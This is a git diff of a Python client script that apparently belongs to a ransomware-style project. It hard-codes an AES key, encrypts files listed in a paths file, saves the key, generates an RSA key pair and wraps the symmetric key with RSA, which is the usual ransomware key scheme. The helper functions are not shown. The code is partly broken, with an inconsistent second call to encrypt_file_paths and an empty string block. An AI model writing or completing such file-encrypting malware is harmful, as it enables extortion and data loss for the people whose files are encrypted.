@@ -21,48 +21,47 @@ how the pipeline works (when you run the client.exe file):
 from utils import *
 
 #1
-a=generate_key(16)
+ascii_key= "vG7pyhyrDzSnqcJ8"
+#generate_key(16)
 
 #2
-#findTxtFile()
+file_contains_paths ="paths.txt"
+findTxtFile( file_contains_paths )
 
 #3
-# here we need to encrypt the test files from the previous step, but for now we use a dummy file
-#ascii_key = testEncryption()
-file_path = r'file_paths.txt'
-
-with open(file_path, 'r') as f:
-        data = f.read()
-encrypted_data = encrypt_data(a, data)
-with open('encrypted_file', 'wb') as f:
-        f.write(encrypted_data)
-
+encrypt_file_paths(ascii_key, file_contains_paths)
 
 #4
-saveKey(a, "Key.key")
+saveKey(ascii_key, "Key.key")
 
 #5
 exported_public_key, exported_private_key =  generateRSAKeys()
 
 #6
-# I removed the \n from the key to make them fit 2 lines
 key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
 saveKey(key_pair, "keyPair.key")
 
 #7
 public_key = RSA.import_key(exported_public_key)
 #convert ascii_key to bytes
-byte_ascii_key = a.encode()
+byte_ascii_key = ascii_key.encode()
 encoded_encrypted_msg = encryptWithRSA(byte_ascii_key, public_key)
 
 #8
 saveKey(encoded_encrypted_msg.decode(), "encryptedKey.key")
-d=decrypt_with_RSA(encoded_encrypted_msg.decode(), exported_private_key)
-# Here we try to decrypt the encrypted data in the .txt file ya Sharaway
-d2=decrypt_data(a,encrypted_data)
-print(encoded_encrypted_msg.decode())
-print(d)
-print(d2)
+
+'''
+'''
+
+
+
+encrypt_file_paths("path.txt")
+
+
+#d2=decrypt_data(ascii_key ,encrypted_data )
+#print(encoded_encrypted_msg.decode())
+#print(d)
+#print(d2)
 # testEncryption()
 # with open("decr.txt", "a") as f:
 #                         f.write(d2 + "\n")
